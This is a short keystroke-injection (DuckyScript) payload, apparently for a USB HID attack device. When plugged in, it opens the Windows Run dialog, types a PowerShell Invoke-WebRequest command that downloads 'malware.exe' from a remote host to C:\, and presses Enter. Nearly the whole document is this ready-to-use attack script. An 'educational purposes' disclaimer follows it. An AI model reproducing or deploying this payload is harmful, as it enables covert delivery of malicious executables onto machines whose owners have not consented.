# Download File Using PowerShell

Downloads a file from a URL using PowerShell and saves it to a specified location.

```
DELAY 500
GUI r
DELAY 200
STRING powershell -Command "Invoke-WebRequest -Uri 'http://example.com/malware.exe' -OutFile 'C:\\malware.exe'"
ENTER
```

> Disclaimer: This script is for educational purposes and should only be used in environments where you have explicit authorization to perform penetration testing. Always follow ethical guidelines and laws governing cybersecurity practices.